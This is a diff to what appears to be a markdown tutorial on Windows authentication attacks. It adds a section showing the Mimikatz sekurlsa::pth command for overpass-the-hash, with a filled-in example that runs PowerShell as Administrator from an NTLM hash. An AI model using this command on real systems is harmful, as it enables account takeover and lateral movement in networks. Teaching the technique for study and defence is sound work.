@@ -111,7 +111,23 @@ By the way, check out [Mimikatz's wiki](https://github.com/gentilkiwi/mimikatz/w
 ## Piecing it all together
 
 Let's recap what we needed to authenticate as a user:
-[x] Username
-[x] Domain name
-[x] Timestamp
-[x] NTLM hash
+- [x] Username
+- [x] Domain name
+- [x] Timestamp
+- [x] NTLM hash
+
+There are many ways to spawn a process as a new user, the quickiest and most common is to use Mimikatz once again. Here's the syntax:
+
+```
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<executable>
+
+EXAMPLE:
+mimikatz # sekurlsa::pth /user:Administrator /domain:targetnet.notso.pro /ntlm:007461b27da66eded419e8db22307c4f /run:powershell.exe
+```
+
+The `pth` command of Mimikatz's `sekurlsa` module is the one responsible for executing _overpass-the-hash_ attacks. It spawns a new process belonging to the specified user, running the executable written after the `/run` option.
+
+
+
+
+
